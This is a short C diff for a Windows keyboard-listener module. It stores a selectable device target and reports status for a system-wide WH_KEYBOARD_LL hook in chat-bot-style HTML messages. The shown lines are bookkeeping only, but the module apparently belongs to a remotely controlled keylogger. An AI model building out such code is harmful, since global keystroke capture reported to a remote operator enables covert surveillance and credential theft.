@@ -258,25 +258,32 @@ void keyboard_listener_cleanup(void)
     listener_started = 0;
 }
 
+static char windows_selected_target[128] = "all";
+
 int keyboard_get_device_list(char *buffer, size_t max_len)
 {
     if (!buffer || max_len == 0) return 0;
     snprintf(buffer, max_len,
              "⌨️ <b>Windows Keyboard Devices:</b>\n\n"
              "• <b>[0]</b> <code>WH_KEYBOARD_LL</code> (Low-Level Windows Hook) — 🟢 <b>ACTIVE</b>\n\n"
-             "🎯 <b>Current Target:</b> <code>all</code> (System-wide global hook)");
+             "🎯 <b>Current Target:</b> <code>%s</code>", windows_selected_target);
     return 1;
 }
 
-int keyboard_select_device([[maybe_unused]] const char *target)
+int keyboard_select_device(const char *target)
 {
+    if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
+        snprintf(windows_selected_target, sizeof(windows_selected_target), "all");
+    } else {
+        snprintf(windows_selected_target, sizeof(windows_selected_target), "%s", target);
+    }
     return 1;
 }
 
 void keyboard_get_selected_target(char *buffer, size_t max_len)
 {
     if (buffer && max_len > 0) {
-        snprintf(buffer, max_len, "all (System-wide Hook)");
+        snprintf(buffer, max_len, "%s", windows_selected_target);
     }
 }
 
@@ -285,4 +292,5 @@ int keyboard_get_device_count(void)
     return 1;
 }
 #endif
+
 
